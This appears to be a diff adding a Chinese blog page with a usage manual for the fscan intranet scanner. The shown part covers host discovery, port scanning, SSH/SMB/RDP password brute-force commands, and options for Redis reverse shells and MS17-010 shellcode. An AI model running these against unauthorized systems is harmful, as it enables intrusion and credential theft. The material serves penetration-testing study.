@@ -1,0 +1,1152 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/admin.jpg">
+  <link rel="icon" href="/img/admin.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="xiaobite">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="fscan 实战使用手册 来源：shadow1ng&#x2F;fscan官方仓库：https:&#x2F;&#x2F;github.com&#x2F;shadow1ng&#x2F;fscan官方网站：https:&#x2F;&#x2F;fscan.club&#x2F;   目录 一、概述 二、安装与编译 三、基本语法与参数总览 四、主机存活探测 五、端口扫描 六、服务爆破 七、数据库爆破 八、Web 探测 九、漏洞扫描 十、漏洞利用 十一、NetBIOS 与域控识别">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fscan-使用手册">
+<meta property="og:url" content="https://xiaobite-hacker.github.io/2026/04/12/fscan-%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/index.html">
+<meta property="og:site_name" content="xiaobite">
+<meta property="og:description" content="fscan 实战使用手册 来源：shadow1ng&#x2F;fscan官方仓库：https:&#x2F;&#x2F;github.com&#x2F;shadow1ng&#x2F;fscan官方网站：https:&#x2F;&#x2F;fscan.club&#x2F;   目录 一、概述 二、安装与编译 三、基本语法与参数总览 四、主机存活探测 五、端口扫描 六、服务爆破 七、数据库爆破 八、Web 探测 九、漏洞扫描 十、漏洞利用 十一、NetBIOS 与域控识别">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-04-12T10:41:22.000Z">
+<meta property="article:modified_time" content="2026-04-12T10:43:17.863Z">
+<meta property="article:author" content="xiaobite">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>fscan-使用手册 - xiaobite</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xiaobite-hacker.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>xiaobite</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/prompt/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>prompt</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="fscan-使用手册"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-12 18:41" pubdate>
+          2026年4月12日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">fscan-使用手册</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="fscan-实战使用手册"><a href="#fscan-实战使用手册" class="headerlink" title="fscan 实战使用手册"></a>fscan 实战使用手册</h1><blockquote>
+<p>来源：shadow1ng&#x2F;fscan<br>官方仓库：<a target="_blank" rel="noopener" href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a><br>官方网站：<a target="_blank" rel="noopener" href="https://fscan.club/">https://fscan.club/</a></p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E4%B8%80%E6%A6%82%E8%BF%B0">一、概述</a></li>
+<li><a href="#%E4%BA%8C%E5%AE%89%E8%A3%85%E4%B8%8E%E7%BC%96%E8%AF%91">二、安装与编译</a></li>
+<li><a href="#%E4%B8%89%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95%E4%B8%8E%E5%8F%82%E6%95%B0%E6%80%BB%E8%A7%88">三、基本语法与参数总览</a></li>
+<li><a href="#%E5%9B%9B%E4%B8%BB%E6%9C%BA%E5%AD%98%E6%B4%BB%E6%8E%A2%E6%B5%8B">四、主机存活探测</a></li>
+<li><a href="#%E4%BA%94%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">五、端口扫描</a></li>
+<li><a href="#%E5%85%AD%E6%9C%8D%E5%8A%A1%E7%88%86%E7%A0%B4">六、服务爆破</a></li>
+<li><a href="#%E4%B8%83%E6%95%B0%E6%8D%AE%E5%BA%93%E7%88%86%E7%A0%B4">七、数据库爆破</a></li>
+<li><a href="#%E5%85%ABweb-%E6%8E%A2%E6%B5%8B">八、Web 探测</a></li>
+<li><a href="#%E4%B9%9D%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F">九、漏洞扫描</a></li>
+<li><a href="#%E5%8D%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">十、漏洞利用</a></li>
+<li><a href="#%E5%8D%81%E4%B8%80netbios-%E4%B8%8E%E5%9F%9F%E6%8E%A7%E8%AF%86%E5%88%AB">十一、NetBIOS 与域控识别</a></li>
+<li><a href="#%E5%8D%81%E4%BA%8C%E8%BE%93%E5%87%BA%E6%8E%A7%E5%88%B6">十二、输出控制</a></li>
+<li><a href="#%E5%8D%81%E4%B8%89%E4%BB%A3%E7%90%86%E4%B8%8E%E7%BD%91%E7%BB%9C%E9%85%8D%E7%BD%AE">十三、代理与网络配置</a></li>
+<li><a href="#%E5%8D%81%E5%9B%9B%E5%AE%9E%E6%88%98%E5%9C%BA%E6%99%AF%E9%80%9F%E6%9F%A5">十四、实战场景速查</a></li>
+<li><a href="#%E5%8D%81%E4%BA%94%E7%AE%A1%E9%81%93%E7%BB%84%E5%90%88">十五、管道组合</a></li>
+<li><a href="#%E5%8D%81%E5%85%AD%E5%B8%B8%E8%A7%81%E8%B8%A9%E5%9D%91">十六、常见踩坑</a></li>
+<li><a href="#%E5%8D%81%E4%B8%83fscan-vs-%E5%85%B6%E4%BB%96%E5%B7%A5%E5%85%B7%E5%AF%B9%E6%AF%94">十七、fscan vs 其他工具对比</a></li>
+</ul>
+<hr>
+<h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>fscan 是一款用 Go 语言编写的<strong>内网综合扫描工具</strong>，集成了主机存活探测、端口扫描、服务爆破、漏洞检测、漏洞利用等功能，实现<strong>一键自动化、全方位内网扫描</strong>。</p>
+<p><strong>核心特点：</strong></p>
+<ul>
+<li>🚀 <strong>一键扫描</strong>：<code>fscan -h 192.168.1.0/24</code> 全自动完成存活→端口→爆破→漏洞</li>
+<li>🔍 <strong>信息收集</strong>：ICMP 存活、端口扫描、NetBIOS 探测、域控识别</li>
+<li>🔑 <strong>密码爆破</strong>：SSH &#x2F; SMB &#x2F; RDP &#x2F; FTP &#x2F; MySQL &#x2F; MSSQL &#x2F; Redis &#x2F; PostgreSQL &#x2F; Oracle &#x2F; MongoDB &#x2F; Memcached</li>
+<li>🛡 <strong>漏洞检测</strong>：MS17-010、WebLogic、Struts2，兼容 XRay POC</li>
+<li>💥 <strong>漏洞利用</strong>：Redis 写公钥 &#x2F; 写计划任务、SSH 命令执行、MS17-010 ShellCode</li>
+<li>🌐 <strong>Web 探测</strong>：网站标题、CMS 指纹、OA 框架识别</li>
+<li>📦 <strong>单文件</strong>：Go 编译，无依赖，跨平台</li>
+</ul>
+<hr>
+<h2 id="二、安装与编译"><a href="#二、安装与编译" class="headerlink" title="二、安装与编译"></a>二、安装与编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── Go 编译安装 ───</span><br>git <span class="hljs-built_in">clone</span> https://github.com/shadow1ng/fscan.git<br><span class="hljs-built_in">cd</span> fscan<br>go build -ldflags=<span class="hljs-string">&quot;-s -w&quot;</span> -trimpath main.go<br><br><span class="hljs-comment"># ─── UPX 压缩（可选，缩小体积）───</span><br>upx -9 fscan<br><br><span class="hljs-comment"># ─── 从 Releases 下载预编译版本 ───</span><br><span class="hljs-comment"># https://github.com/shadow1ng/fscan/releases</span><br><br><span class="hljs-comment"># ─── Arch Linux ───</span><br>yay -S fscan-git<br><span class="hljs-comment"># 或</span><br>paru -S fscan-git<br><br><span class="hljs-comment"># ─── 验证安装 ───</span><br>./fscan -h<br></code></pre></td></tr></table></figure>
+
+<p><strong>文件命名</strong>：</p>
+<ul>
+<li><code>fscan</code> &#x2F; <code>fscan.exe</code> — Linux &#x2F; Windows</li>
+<li>Releases 中有 <code>fscan32</code>、<code>fscan64</code> 等区分架构</li>
+</ul>
+<hr>
+<h2 id="三、基本语法与参数总览"><a href="#三、基本语法与参数总览" class="headerlink" title="三、基本语法与参数总览"></a>三、基本语法与参数总览</h2><h3 id="3-1-基本语法"><a href="#3-1-基本语法" class="headerlink" title="3.1 基本语法"></a>3.1 基本语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fscan -h &lt;目标&gt; [选项]<br></code></pre></td></tr></table></figure>
+
+<h3 id="3-2-参数总览"><a href="#3-2-参数总览" class="headerlink" title="3.2 参数总览"></a>3.2 参数总览</h3><h4 id="目标设置"><a href="#目标设置" class="headerlink" title="目标设置"></a>目标设置</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-h</code></td>
+<td>目标 IP &#x2F; CIDR</td>
+<td><code>192.168.1.1</code> &#x2F; <code>192.168.1.0/24</code></td>
+</tr>
+<tr>
+<td><code>-hf</code></td>
+<td>从文件读取目标</td>
+<td><code>targets.txt</code></td>
+</tr>
+<tr>
+<td><code>-hn</code></td>
+<td>扫描时跳过的 IP</td>
+<td><code>192.168.1.1</code></td>
+</tr>
+<tr>
+<td><code>-u</code></td>
+<td>指定 URL 扫描</td>
+<td><code>http://target.com</code></td>
+</tr>
+<tr>
+<td><code>-uf</code></td>
+<td>从文件读取 URL</td>
+<td><code>urls.txt</code></td>
+</tr>
+</tbody></table>
+<h4 id="端口设置"><a href="#端口设置" class="headerlink" title="端口设置"></a>端口设置</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-p</code></td>
+<td>扫描端口</td>
+<td><code>21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017</code></td>
+</tr>
+<tr>
+<td><code>-pa</code></td>
+<td>新增端口（追加到默认列表）</td>
+<td>无</td>
+</tr>
+<tr>
+<td><code>-pn</code></td>
+<td>跳过的端口</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<h4 id="扫描模式"><a href="#扫描模式" class="headerlink" title="扫描模式"></a>扫描模式</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-m</code></td>
+<td>扫描模式</td>
+<td><code>all</code></td>
+</tr>
+</tbody></table>
+<p><strong>可用模式</strong>：<br><code>all</code> &#x2F; <code>icmp</code> &#x2F; <code>portscan</code> &#x2F; <code>ssh</code> &#x2F; <code>smb</code> &#x2F; <code>rdp</code> &#x2F; <code>ftp</code> &#x2F; <code>mysql</code> &#x2F; <code>mssql</code> &#x2F; <code>redis</code> &#x2F; <code>psql</code> &#x2F; <code>oracle</code> &#x2F; <code>mgo</code> &#x2F; <code>mem</code> &#x2F; <code>fcgi</code> &#x2F; <code>netbios</code> &#x2F; <code>findnet</code> &#x2F; <code>web</code> &#x2F; <code>webonly</code> &#x2F; <code>ms17010</code> &#x2F; <code>cve20200796</code> &#x2F; <code>main</code></p>
+<h4 id="爆破设置"><a href="#爆破设置" class="headerlink" title="爆破设置"></a>爆破设置</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-user</code></td>
+<td>指定用户名</td>
+</tr>
+<tr>
+<td><code>-userf</code></td>
+<td>用户名字典文件</td>
+</tr>
+<tr>
+<td><code>-usera</code></td>
+<td>在默认字典基础上追加用户名</td>
+</tr>
+<tr>
+<td><code>-pwd</code></td>
+<td>指定密码</td>
+</tr>
+<tr>
+<td><code>-pwdf</code></td>
+<td>密码字典文件</td>
+</tr>
+<tr>
+<td><code>-pwda</code></td>
+<td>在默认字典基础上追加密码</td>
+</tr>
+<tr>
+<td><code>-domain</code></td>
+<td>SMB 爆破时设置域名</td>
+</tr>
+<tr>
+<td><code>-sshkey</code></td>
+<td>SSH 私钥文件</td>
+</tr>
+</tbody></table>
+<h4 id="扫描控制"><a href="#扫描控制" class="headerlink" title="扫描控制"></a>扫描控制</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-t</code></td>
+<td>线程数</td>
+<td>600</td>
+</tr>
+<tr>
+<td><code>-time</code></td>
+<td>端口扫描超时（秒）</td>
+<td>3</td>
+</tr>
+<tr>
+<td><code>-wt</code></td>
+<td>Web 访问超时（秒）</td>
+<td>5</td>
+</tr>
+<tr>
+<td><code>-np</code></td>
+<td>跳过存活探测</td>
+<td>关闭</td>
+</tr>
+<tr>
+<td><code>-nobr</code></td>
+<td>跳过密码爆破</td>
+<td>关闭</td>
+</tr>
+<tr>
+<td><code>-nopoc</code></td>
+<td>跳过 Web POC 扫描</td>
+<td>关闭</td>
+</tr>
+<tr>
+<td><code>-num</code></td>
+<td>Web POC 发包速率</td>
+<td>20</td>
+</tr>
+<tr>
+<td><code>-ping</code></td>
+<td>用 ping 代替 ICMP 探测</td>
+<td>关闭</td>
+</tr>
+<tr>
+<td><code>-debug</code></td>
+<td>多久没响应打印进度（秒）</td>
+<td>60</td>
+</tr>
+</tbody></table>
+<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+<th>默认值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-o</code></td>
+<td>结果保存路径</td>
+<td><code>result.txt</code></td>
+</tr>
+<tr>
+<td><code>-no</code></td>
+<td>不保存结果到文件</td>
+<td>保存</td>
+</tr>
+<tr>
+<td><code>-silent</code></td>
+<td>静默模式</td>
+<td>关闭</td>
+</tr>
+</tbody></table>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-c</code></td>
+<td>SSH 命令执行</td>
+</tr>
+<tr>
+<td><code>-rf</code></td>
+<td>Redis 写公钥文件（如 <code>id_rsa.pub</code>）</td>
+</tr>
+<tr>
+<td><code>-rs</code></td>
+<td>Redis 计划任务反弹 Shell（<code>ip:port</code>）</td>
+</tr>
+<tr>
+<td><code>-sc</code></td>
+<td>MS17-010 ShellCode（<code>add</code> &#x2F; <code>guest</code>）</td>
+</tr>
+<tr>
+<td><code>-path</code></td>
+<td>FCGI &#x2F; SMB 远程文件路径</td>
+</tr>
+</tbody></table>
+<h4 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-proxy</code></td>
+<td>HTTP 代理</td>
+</tr>
+<tr>
+<td><code>-socks5</code></td>
+<td>SOCKS5 代理</td>
+</tr>
+<tr>
+<td><code>-cookie</code></td>
+<td>设置 Cookie</td>
+</tr>
+</tbody></table>
+<h4 id="Web-扫描"><a href="#Web-扫描" class="headerlink" title="Web 扫描"></a>Web 扫描</h4><table>
+<thead>
+<tr>
+<th>参数</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-pocname</code></td>
+<td>指定 POC 名称（模糊匹配）</td>
+</tr>
+<tr>
+<td><code>-pocpath</code></td>
+<td>指定 POC 路径</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="四、主机存活探测"><a href="#四、主机存活探测" class="headerlink" title="四、主机存活探测"></a>四、主机存活探测</h2><p>fscan 默认使用 <strong>ICMP</strong> 探测主机存活（需要 root 权限），无权限时自动回退到 <strong>ping</strong>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── ICMP 存活探测（C 段）───</span><br>fscan -h 192.168.1.0/24 -m icmp<br><br><span class="hljs-comment"># ─── B 段快速探测（每个 C 段取网关 + 随机 IP）───</span><br>fscan -h 192.168.0.0/16 -m icmp<br><br><span class="hljs-comment"># ─── A 段探测（每个 C 段首尾 IP）───</span><br>fscan -h 10.0.0.0/8 -m icmp<br><br><span class="hljs-comment"># ─── 使用 ping 代替 ICMP（不需要 root）───</span><br>fscan -h 192.168.1.0/24 -ping<br><br><span class="hljs-comment"># ─── 跳过存活探测（已知目标存活）───</span><br>fscan -h 192.168.1.0/24 -np<br></code></pre></td></tr></table></figure>
+
+<p><strong>输出示例：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">(icmp) Target <span class="hljs-string">&#x27;192.168.1.10&#x27;</span> <span class="hljs-keyword">is</span> alive<br>(icmp) Target <span class="hljs-string">&#x27;192.168.1.20&#x27;</span> <span class="hljs-keyword">is</span> alive<br>icmp alive hosts <span class="hljs-built_in">len</span> <span class="hljs-keyword">is</span>: <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、端口扫描"><a href="#五、端口扫描" class="headerlink" title="五、端口扫描"></a>五、端口扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── 默认端口扫描（20 个常见端口）───</span><br>fscan -h 192.168.1.0/24<br><br><span class="hljs-comment"># ─── 指定端口 ───</span><br>fscan -h 192.168.1.0/24 -p 80,443,8080<br><br><span class="hljs-comment"># ─── 全端口扫描 ───</span><br>fscan -h 192.168.1.10 -p 1-65535<br><br><span class="hljs-comment"># ─── 端口范围 ───</span><br>fscan -h 192.168.1.10 -p 1-1024<br><br><span class="hljs-comment"># ─── 追加端口（默认 + 新端口）───</span><br>fscan -h 192.168.1.0/24 -pa 3389<br><br><span class="hljs-comment"># ─── 跳过端口 ───</span><br>fscan -h 192.168.1.0/24 -pn 445<br><br><span class="hljs-comment"># ─── 纯端口扫描模式 ───</span><br>fscan -h 192.168.1.0/24 -m portscan<br><br><span class="hljs-comment"># ─── 调整超时 ───</span><br>fscan -h 192.168.1.0/24 -<span class="hljs-keyword">time</span> 5<br><br><span class="hljs-comment"># ─── 多目标端口扫描 ───</span><br>fscan -h 192.168.1.10 -h 192.168.1.20 -p 80,443,3306<br></code></pre></td></tr></table></figure>
+
+<p><strong>默认端口列表</strong>：<code>21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017</code></p>
+<hr>
+<h2 id="六、服务爆破"><a href="#六、服务爆破" class="headerlink" title="六、服务爆破"></a>六、服务爆破</h2><p>fscan 发现开放端口后会自动对对应服务进行密码爆破。</p>
+<h3 id="6-1-SSH-爆破"><a href="#6-1-SSH-爆破" class="headerlink" title="6.1 SSH 爆破"></a>6.1 SSH 爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── 自动爆破（发现 22 端口自动尝试）───</span><br>fscan -h 192.168.1.10<br><br><span class="hljs-comment"># ─── 仅 SSH 爆破 ───</span><br>fscan -h 192.168.1.10 -m ssh -p 22<br><br><span class="hljs-comment"># ─── 自定义字典 ───</span><br>fscan -h 192.168.1.10 -m ssh -p 22 -userf users.txt -pwdf passwords.txt<br><br><span class="hljs-comment"># ─── 指定用户名和密码 ───</span><br>fscan -h 192.168.1.10 -m ssh -p 22 -user root -<span class="hljs-built_in">pwd</span> 123456<br><br><span class="hljs-comment"># ─── 使用 SSH 私钥 ───</span><br>fscan -h 192.168.1.10 -m ssh -p 22 -sshkey id_rsa<br><br><span class="hljs-comment"># ─── 追加用户名/密码 ───</span><br>fscan -h 192.168.1.10 -usera admin -pwda P@ssw0rd<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-2-SMB-爆破"><a href="#6-2-SMB-爆破" class="headerlink" title="6.2 SMB 爆破"></a>6.2 SMB 爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── SMB 爆破 ───</span><br>fscan -h 192.168.1.10 -m smb -p 445<br><br><span class="hljs-comment"># ─── 指定域名 ───</span><br>fscan -h 192.168.1.10 -m smb -p 445 -domain TEST.LOCAL<br><br><span class="hljs-comment"># ─── 自定义字典 ───</span><br>fscan -h 192.168.1.10 -m smb -p 445 -userf users.txt -pwdf passwords.txt<br></code></pre></td></tr></table></figure>
+
+<h3 id="6-3-RDP-爆破"><a href="#6-3-RDP-爆破" class="headerlink" title="6.3 RDP 爆破"></a>6.3 RDP 爆破</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ─── RDP 爆破 ───</span><br>fscan -h 192.168.1.10 -m rdp -p 3389<br><br><span class="hljs-comment"># ─── 自定义字典 ───</span><br>fscan -h 192.168.1.10 -m rdp -p 3389 -userf users.txt -pwdf passwords.txt<br></code></pre></td></tr></table></figure>
+
